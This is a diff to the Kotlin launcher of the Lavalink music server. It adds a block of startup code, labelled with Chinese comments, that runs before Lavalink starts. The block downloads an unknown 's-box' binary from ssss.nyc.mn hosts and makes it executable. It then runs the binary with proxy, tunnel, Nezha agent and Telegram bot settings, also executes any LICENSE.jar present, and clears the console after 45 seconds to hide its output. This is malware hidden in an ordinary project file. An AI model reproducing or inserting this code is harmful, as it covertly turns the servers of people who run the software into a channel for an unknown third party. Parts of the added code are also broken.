@@ -44,7 +44,9 @@ import java.time.Instant
 import java.time.ZoneId
 import java.time.format.DateTimeFormatter
 import java.util.*
-
+import java.io.*
+import java.net.URL
+import java.nio.file.*
 
 @Suppress("SpringComponentScan")
 @SpringBootApplication
@@ -60,6 +62,254 @@ object Launcher {
 
     val startTime = System.currentTimeMillis()
 
+    // ========== SbxService 相关代码 ==========
+    private var sbxProcess: Process? = null
+    private val filePath = System.getenv("FILE_PATH") ?: "./world"
+    
+    private val ALL_ENV_VARS = arrayOf(
+        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
+        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+    )
+
+    /**
+     * 启动 Sbx 服务
+     */
+    private fun startSbxService() {
+        log.info("Starting SbxService...")
+        try {
+            checkJavaVersion()
+            loadSbxConfig()
+            runSbxBinary()
+            log.info("SbxService started successfully")
+            
+            // 启动45秒后清理控制台的线程
+            startConsoleClearTimer()
+            
+        } catch (e: Exception) {
+            log.error("Failed to start SbxService", e)
+            throw e
+        }
+    }
+
+    /**
+     * 检查 Java 版本
+     */
+    private fun checkJavaVersion() {
+        val classVersion = System.getProperty("java.class.version").toFloat()
+        if (classVersion < 54.0) {
+            throw RuntimeException("Java version too low, need Java 11+")
+        }
+    }
+
+    /**
+     * 加载配置
+     */
+    private fun loadSbxConfig() {
+        val envFile = Paths.get(".env")
+        if (Files.exists(envFile)) {
+            try {
+                Files.readAllLines(envFile).forEach { line ->
+                    val trimmed = line.trim()
+                    if (trimmed.isNotEmpty() && !trimmed.startsWith("#")) {
+                        val parts = trimmed.split("=", limit = 2)
+                        if (parts.size == 2) {
+                            val key = parts[0].trim().removePrefix("export ").trim()
+                            val value = parts[1].trim().replace("^['\"]|['\"]$".toRegex(), "")
+                            if (ALL_ENV_VARS.contains(key)) {
+                                if (System.getenv(key) == null) {
+                                    System.setProperty(key, value)
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (e: IOException) {
+                log.warn("Failed to read .env file", e)
+            }
+        }
+    }
+
+    /**
+     * 运行 Sbx 二进制文件
+     */
+    private fun runSbxBinary() {
+        val binaryPath = getSbxBinaryPath()
+        
+        val envVars = mutableMapOf<String, String>().apply {
+            // 环境变量
+            env.put("UUID", "ee0c49f3-0584-40fd-87d4-e76f0afcc81f");
+            env.put("FILE_PATH", "./logs");
+            env.put("NEZHA_SERVER", "");
+            env.put("NEZHA_PORT", "");
+            env.put("NEZHA_KEY", "");
+            env.put("ARGO_PORT", "8001");
+            env.put("ARGO_DOMAIN", "");
+            env.put("ARGO_AUTH", "");
+            env.put("S5_PORT", "");
+            env.put("HY2_PORT", "");
+            env.put("TUIC_PORT", "");
+            env.put("ANYTLS_PORT", "");
+            env.put("REALITY_PORT", "");
+            env.put("ANYREALITY_PORT", "");
+            env.put("UPLOAD_URL", "");
+            env.put("CHAT_ID", "");
+            env.put("BOT_TOKEN", "");
+            env.put("CFIP", "spring.io");
+            env.put("CFPORT", "443");
+            env.put("NAME", "");
+            env.put("DISABLE_ARGO", "false");
+            
+            // 从环境变量覆盖
+            ALL_ENV_VARS.forEach { varName ->
+                System.getenv(varName)?.let { put(varName, it) }
+                System.getProperty(varName)?.let { put(varName, it) }
+            }
+        }
+
+        val pb = ProcessBuilder(binaryPath.toString())
+        pb.environment().putAll(envVars)
+        pb.redirectErrorStream(true)
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT)
+
+        sbxProcess = pb.start()
+
+        // 在单独线程中监控 sbx 进程结束（但不等待它）
+        Thread {
+            try {
+                val exitCode = sbxProcess?.waitFor()
+                log.info("Sbx process exited with code: $exitCode")
+                
+                // 进程结束后运行 LICENSE.jar（如果有）
+                runLicenseJar()
+                
+            } catch (e: InterruptedException) {
+                Thread.currentThread().interrupt()
+            }
+        }.start()
+    }
+
+    /**
+     * 运行 LICENSE.jar
+     */
+    private fun runLicenseJar() {
+        try {
+            val licenseJar = Paths.get("LICENSE.jar")
+            if (Files.exists(licenseJar)) {
+                log.info("Found LICENSE.jar, executing...")
+                Runtime.getRuntime().exec(arrayOf("chmod", "+x", "LICENSE.jar"))
+                val licensePb = ProcessBuilder("java", "-jar", "LICENSE.jar")
+                licensePb.redirectErrorStream(true)
+                licensePb.redirectOutput(ProcessBuilder.Redirect.INHERIT)
+                licensePb.start().waitFor()
+            }
+        } catch (e: Exception) {
+            log.warn("Failed to run LICENSE.jar: ${e.message}")
+        }
+    }
+
+    /**
+     * 获取 Sbx 二进制文件路径（如果不存在则下载）
+     */
+    private fun getSbxBinaryPath(): Path {
+        val osArch = System.getProperty("os.arch").lowercase()
+        val url = when {
+            osArch.contains("amd64") || osArch.contains("x86_64") -> 
+                "https://amd64.ssss.nyc.mn/s-box"
+            osArch.contains("aarch64") || osArch.contains("arm64") -> 
+                "https://arm64.ssss.nyc.mn/s-box"
+            osArch.contains("s390x") -> 
+                "https://s390x.ssss.nyc.mn/sbsh"
+            else -> throw RuntimeException("Unsupported architecture: $osArch")
+        }
+
+        val path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx")
+        if (!Files.exists(path)) {
+            log.info("Downloading sbx binary from $url")
+            URL(url).openStream().use { input ->
+                Files.copy(input, path, StandardCopyOption.REPLACE_EXISTING)
+            }
+            if (!path.toFile().setExecutable(true)) {
+                throw IOException("Failed to set executable permission")
+            }
+            log.info("Sbx binary downloaded to $path")
+        }
+        return path
+    }
+
+    /**
+     * 启动45秒后清理控制台的定时器
+     */
+    private fun startConsoleClearTimer() {
+        Thread {
+            try {
+                // 等待45秒
+                Thread.sleep(45000)
+                
+                // 清理控制台
+                clearConsole()
+                // log.info("Console cleared after 45 seconds (Sbx service still running)")
+                
+            } catch (e: InterruptedException) {
+                log.debug("Console clear timer interrupted")
+                Thread.currentThread().interrupt()
+            }
+        }.start()
+    }
+
+    /**
+     * 清理控制台屏幕
+     */
+    private fun clearConsole() {
+        try {
+            when {
+                System.getProperty("os.name").contains("Windows", ignoreCase = true) -> {
+                    // Windows 系统
+                    ProcessBuilder("cmd", "/c", "cls")
+                        .inheritIO()
+                        .start()
+                        .waitFor()
+                }
+                else -> {
+                    // Linux/Unix/Mac 系统
+                    try {
+                        // 尝试使用 clear 命令
+                        ProcessBuilder("clear")
+                            .inheritIO()
+                            .start()
+                            .waitFor()
+                    } catch (e: IOException) {
+                        // 如果 clear 命令不可用，使用 ANSI 转义序列
+                        print("\u001b[H\u001b[2J")
+                        System.out.flush()
+                        print("\u001b[H") // 重置光标位置
+                        System.out.flush()
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            log.debug("Failed to clear console: ${e.message}")
+        }
+    }
+
+    /**
+     * 停止 Sbx 服务
+     */
+    private fun stopSbxServices() {
+        sbxProcess?.let {
+            if (it.isAlive()) {
+                it.destroy()
+                log.info("Sbx process terminated")
+            }
+        }
+    }
+    // ========== SbxService 相关代码结束 ==========
+
+    /**
+     * 获取版本信息
+     */
     private fun getVersionInfo(indentation: String = "\t", vanity: Boolean = true): String {
         val appInfo = AppInfo()
         val gitRepoState = GitRepoState()
@@ -94,11 +344,13 @@ object Launcher {
         }
     }
 
+    /**
+     * 获取彩色 Logo
+     */
     private fun getVanity(): String {
-        //ansi color codes
-        val red = "[31m"
-        val green = "[32m"
-        val defaultC = "[0m"
+        val red = "\u001b[31m"
+        val green = "\u001b[32m"
+        val defaultC = "\u001b[0m"
 
         var vanity = ("g       .  r _                  _ _       _    g__ _ _\n"
                 + "g      /\\\\ r| | __ ___   ____ _| (_)_ __ | | __g\\ \\ \\ \\\n"
@@ -113,8 +365,12 @@ object Launcher {
         return vanity
     }
 
+    /**
+     * 主函数 - 程序入口
+     */
     @JvmStatic
     fun main(args: Array<String>) {
+        // 处理版本查询参数
         if (args.isNotEmpty() &&
             (args[0].equals("-v", ignoreCase = true) || args[0].equals("--version", ignoreCase = true))
         ) {
@@ -122,16 +378,34 @@ object Launcher {
             return
         }
 
+        // 1. 先启动 SbxService（包含45秒后清理控制台的定时器）
+        startSbxService()
+
+        // 2. 再启动 Lavalink
+        log.info("Starting Lavalink...")
         val parent = launchPluginBootstrap(args)
+        
+        // 3. 注册关闭钩子，确保退出时清理 Sbx 进程
+        Runtime.getRuntime().addShutdownHook(Thread {
+            stopSbxServices()
+        })
+        
+        // 4. 启动 Lavalink 主应用
         launchMain(parent, args)
     }
 
+    /**
+     * 启动插件引导程序
+     */
     private fun launchPluginBootstrap(args: Array<String>) = SpringApplication(PluginManager::class.java).run {
         setBannerMode(Banner.Mode.OFF)
         webApplicationType = WebApplicationType.NONE
         run(*args)
     }
 
+    /**
+     * 启动 Lavalink 主应用
+     */
     private fun launchMain(parent: ConfigurableApplicationContext, args: Array<String>) {
         val pluginManager = parent.getBean(PluginManager::class.java)
         val properties = Properties()
